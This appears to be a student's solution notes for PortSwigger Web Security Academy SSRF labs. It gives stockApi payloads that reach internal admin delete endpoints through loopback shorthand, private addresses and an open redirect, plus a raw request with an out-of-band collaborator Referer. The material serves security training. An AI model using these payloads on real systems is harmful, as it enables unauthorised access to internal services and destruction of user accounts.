# SSRF 

URL validation bypass cheat sheet -> https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

## Lab: Basic SSRF against the local server

```
stockApi=http://127.0.0.1/admin/delete?username=carlos&storeId=1
```

## Lab: Basic SSRF against another back-end system

```
stockApi=http://192.168.0.61:8080/admin/delete?username=carlos
```
 
## Lab: SSRF with blacklist-based input filter
 
```
stockApi=http://127.1/Admin/delete?username=carlos
```
 
## Lab: SSRF with filter bypass via open redirection vulnerability

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

## Lab: Blind SSRF with out-of-band detection

```
GET /product?productId=1 HTTP/2
Host: 0aaa00a703e636c680444ea300650051.web-security-academy.net
Cookie: session=7TnJ7BCej0VHOyZhEQbYP93nMNYHELKb
Referer: https://wxxasaje3vjhwtpff9hopsqr4ia9y0ood.oastify.com
```

 

 



